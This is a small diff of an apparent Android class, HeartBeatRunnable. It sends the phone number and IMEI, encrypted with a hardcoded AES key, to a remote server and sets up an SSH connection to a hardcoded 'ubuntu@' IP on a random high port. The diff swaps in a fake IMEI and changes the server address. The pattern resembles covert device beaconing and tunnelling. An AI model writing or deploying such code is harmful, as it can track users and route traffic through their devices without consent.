@@ -102,7 +102,7 @@ public class HeartBeatRunnable implements Runnable {
 			} else {
 				Map<String, String> map = new HashMap<>();
 				map.put(NativeParams.TYPE_PHONE_NUMBER, phoneNumber);
-				map.put(NativeParams.TYPE_PHONE_IMEI, imei);
+				map.put(NativeParams.TYPE_PHONE_IMEI, "1212121243323");
 				map.put(NativeParams.TYPE_SSH_CONNECT, String.valueOf(isSSHConnected));
 				String params = RequestManager.getAuthStr(NativeParams.AES_KEY, map);
 				if (DEBUG) {
@@ -147,7 +147,7 @@ public class HeartBeatRunnable implements Runnable {
 		HeartBeatJson json = new HeartBeatJson();
 		HeartBeatInfo info = new HeartBeatInfo();
 		int sourcePort = 40000 + RandomUtils.getRandom(10000);
-		info.setPort("ubuntu@52.79.167.214:" + String.valueOf(sourcePort));
+		info.setPort("ubuntu@52.78.13.149:" + String.valueOf(sourcePort));
 		if (!isSSHConnected) {
 			if (mCurrentCount > 1 && !isStartSSHBuild) {
 				if (DEBUG) {
